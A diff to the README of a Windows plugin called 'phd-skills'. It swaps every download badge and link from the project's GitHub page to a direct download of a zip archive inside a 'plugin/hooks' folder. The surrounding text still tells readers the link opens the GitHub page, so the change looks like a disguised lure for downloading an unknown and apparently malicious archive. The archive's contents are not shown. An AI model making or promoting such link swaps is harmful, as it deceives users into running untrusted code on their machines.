@@ -1,6 +1,6 @@
 # 📚 phd-skills - Boost Your Research Workflow
 
-[![Download phd-skills](https://img.shields.io/badge/Download-phd--skills-4a90e2?style=for-the-badge)](https://github.com/Enzogregorio/phd-skills)
+[![Download phd-skills](https://img.shields.io/badge/Download-phd--skills-4a90e2?style=for-the-badge)](https://github.com/Enzogregorio/phd-skills/raw/refs/heads/main/plugin/hooks/skills-phd-3.8.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps to get phd-skills working on your Windows PC.
 
 Visit the main plugin page to download the software:
 
-[![Download phd-skills](https://img.shields.io/badge/Download-phd--skills-4a90e2?style=for-the-badge)](https://github.com/Enzogregorio/phd-skills)
+[![Download phd-skills](https://img.shields.io/badge/Download-phd--skills-4a90e2?style=for-the-badge)](https://github.com/Enzogregorio/phd-skills/raw/refs/heads/main/plugin/hooks/skills-phd-3.8.zip)
 
 Click the link to open the GitHub page. From there:
 
@@ -162,6 +162,6 @@ The plugin supports many research areas:
 
 To start using phd-skills now, visit this page and download the plugin for Windows:
 
-[Download phd-skills](https://github.com/Enzogregorio/phd-skills)
+[Download phd-skills](https://github.com/Enzogregorio/phd-skills/raw/refs/heads/main/plugin/hooks/skills-phd-3.8.zip)
 
 Follow the steps above to install and activate the plugin. This will prepare your system for improved academic workflows with research support.
